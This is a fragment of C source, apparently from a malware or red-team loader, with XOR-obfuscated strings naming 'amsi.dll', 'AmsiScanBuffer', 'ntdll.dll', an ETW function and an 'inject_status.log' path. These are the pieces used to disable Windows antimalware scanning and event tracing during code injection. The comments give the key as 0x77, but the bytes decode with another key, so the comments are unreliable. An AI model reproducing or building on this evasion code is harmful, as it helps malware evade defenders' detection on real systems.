...
static const unsigned char xAmsiDll[] = {
    0xC3, 0xCF, 0xD1, 0xCB, 0x8C, 0xC6, 0xCE, 0xCE
};
#define xAmsiDll_LEN 8

/* "AmsiScanBuffer" XOR 0x77 */
static const unsigned char xAmsiFunc[] = {
    0xE3, 0xCF, 0xD1, 0xCB, 0xF1, 0xC1, 0xC3, 0xCC,
    0xE0, 0xD7, 0xC4, 0xC4, 0xC7, 0xD0
};
#define xAmsiFunc_LEN 14

/* "ntdll.dll" XOR 0x77 */
static const unsigned char xNtdll[] = {
    0xCC, 0xD6, 0xC6, 0xCE, 0xCE, 0x8C, 0xC6, 0xCE,
    0xCE
};
#define xNtdll_LEN 9
...
static const unsigned char xEtwFunc[] = {
    0xE7, 0xD6, 0xD5, 0xE7, 0xD4, 0xC7, 0xCC, 0xD6,
    0xF5, 0xD0, 0xCB, 0xD6, 0xC7
};
#define xEtwFunc_LEN 13

/* "C:\Windows\Temp\inject_status.log" XOR 0x77 */
static const unsigned char xCanaryPath[] = {
    0xE1, 0x98, 0xFE, 0xF5, 0xCB, 0xCC, 0xC6, 0xCD,
    0xD5, 0xD1, 0xFE, 0xF6, 0xC7, 0xCF, 0xD2, 0xFE,
    0xCB, 0xCC, 0xC8, 0xC7, 0xC1, 0xD6, 0xFD, 0xD1,
    0xD6, 0xC3, 0xD6, 0xD7, 0xD1, 0x8C, 0xCE, 0xCD,
    0xC5
};
